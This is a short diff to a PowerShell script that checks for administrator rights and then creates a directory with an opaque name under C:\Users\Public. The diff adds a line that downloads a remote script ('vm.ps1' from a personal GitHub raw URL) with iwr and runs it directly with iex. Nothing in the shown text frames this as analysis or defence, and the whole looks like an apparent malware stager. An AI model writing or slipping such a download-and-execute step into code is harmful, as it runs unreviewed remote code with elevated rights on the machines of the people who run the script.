@@ -8,6 +8,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Start-Sleep -Seconds 8
 }
 
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)
+
 $dir = "C:\Users\Public\150F4013"
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $dir
